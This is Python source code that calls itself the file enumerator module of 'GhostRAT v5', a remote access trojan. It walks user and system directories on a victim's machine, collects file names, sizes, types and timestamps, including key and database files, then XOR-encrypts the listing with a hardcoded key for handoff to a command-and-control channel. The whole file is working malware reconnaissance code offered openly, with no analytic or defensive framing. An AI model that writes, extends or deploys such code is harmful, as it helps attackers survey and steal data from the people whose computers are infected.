"""
GhostRAT v5 — File Enumerator Module (Python)

Enumerates files on the victim machine and encodes results for C2 delivery.
"""

import os
import time
import threading
from typing import List, Dict, Any, Optional, Callable


class FileEnumerator:
    """File enumeration module."""

    def __init__(self, crypto_key: str = "GHOSTRATV5", max_files: int = 10000,
                 file_types: Optional[List[str]] = None,
                 directories: Optional[List[str]] = None):
        self.crypto_key = crypto_key
        self.max_files = max_files
        self.file_types = file_types
        self.directories = directories or [
            'C:\\Users', 'C:\\Program Files', 'C:\\ProgramData',
            'D:\\', '/home', '/tmp'
        ]
        self.on_files_found: Optional[Callable] = None
        self._enum_thread: Optional[threading.Thread] = None

    def enumerate(self) -> Dict[str, Any]:
        """Enumerate files in specified directories."""
        all_files = []
        errors = []

        for directory in self.directories:
            try:
                files = self._enumerate_directory(directory)
                all_files.extend(files)
            except Exception as e:
                errors.append({'directory': directory, 'error': str(e)})

            if len(all_files) >= self.max_files:
                break

        # Filter by file type if specified
        if self.file_types:
            all_files = [f for f in all_files
                        if self._get_extension(f.get('name', '')).lower() in self.file_types]

        # Limit to max files
        all_files = all_files[:self.max_files]

        # Encrypt
        encrypted = self._encrypt_file_data(all_files)

        if self.on_files_found:
            self.on_files_found({
                'files': encrypted,
                'fileCount': len(all_files),
                'errors': errors,
                'totalScanned': len(all_files)
            })

        return {'files': all_files, 'fileCount': len(all_files), 'errors': errors}

    def _enumerate_directory(self, directory: str) -> List[Dict[str, Any]]:
        """Enumerate files in a directory."""
        files = []
        if not os.path.exists(directory):
            return files

        try:
            for root, dirs, filenames in os.walk(directory):
                for filename in filenames:
                    filepath = os.path.join(root, filename)
                    try:
                        stat = os.stat(filepath)
                        files.append({
                            'name': filepath,
                            'size': stat.st_size,
                            'type': self._get_mime_type(filename),
                            'lastModified': stat.st_mtime,
                            'lastModifiedDate': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(stat.st_mtime))
                        })
                    except (OSError, PermissionError):
                        continue

                if len(files) >= self.max_files:
                    break
        except (OSError, PermissionError):
            pass

        return files

    def _get_extension(self, filename: str) -> str:
        """Get file extension."""
        parts = filename.rsplit('.', 1)
        return parts[-1] if len(parts) > 1 else ''

    def _get_mime_type(self, filename: str) -> str:
        """Get MIME type from filename."""
        ext = self._get_extension(filename).lower()
        mime_map = {
            'pdf': 'application/pdf',
            'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            'xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            'jpg': 'image/jpeg', 'jpeg': 'image/jpeg', 'png': 'image/png',
            'mp3': 'audio/mpeg', 'mp4': 'video/mp4',
            'rsa': 'application/octet-stream', 'pub': 'text/plain',
            'html': 'text/html', 'js': 'application/javascript',
            'json': 'application/json', 'xml': 'application/xml',
            'sql': 'application/x-sqlite3', 'db': 'application/x-sqlite3',
        }
        return mime_map.get(ext, 'application/octet-stream')

    def _encrypt_file_data(self, files: List[Dict[str, Any]]) -> bytes:
        """Encrypt file enumeration data."""
        file_data = bytearray()
        for file in files:
            # Filename (64 bytes)
            name = file.get('name', '')[:64]
            name_bytes = name.encode('utf-8', errors='replace')
            file_data.extend(name_bytes.ljust(64, b'\x00'))

            # File type (32 bytes)
            ftype = file.get('type', '')[:32]
            type_bytes = ftype.encode('utf-8', errors='replace')
            file_data.extend(type_bytes.ljust(32, b'\x00'))

            # File size (8 bytes, little-endian)
            size = file.get('size', 0)
            file_data.extend(size.to_bytes(8, 'little'))

            # Last modified timestamp (8 bytes, Unix epoch)
            timestamp = int(file.get('lastModified', 0))
            file_data.extend(timestamp.to_bytes(8, 'little'))

        return self._xor_encrypt(bytes(file_data), self.crypto_key)

    def _xor_encrypt(self, data: bytes, key: str) -> bytes:
        """XOR encrypt data."""
        key_bytes = key.encode('utf-8')
        return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))

    def get_stats(self) -> Dict[str, Any]:
        """Get enumerator statistics."""
        return {
            'directoriesScanned': len(self.directories),
            'maxFiles': self.max_files,
            'fileTypes': self.file_types
        }
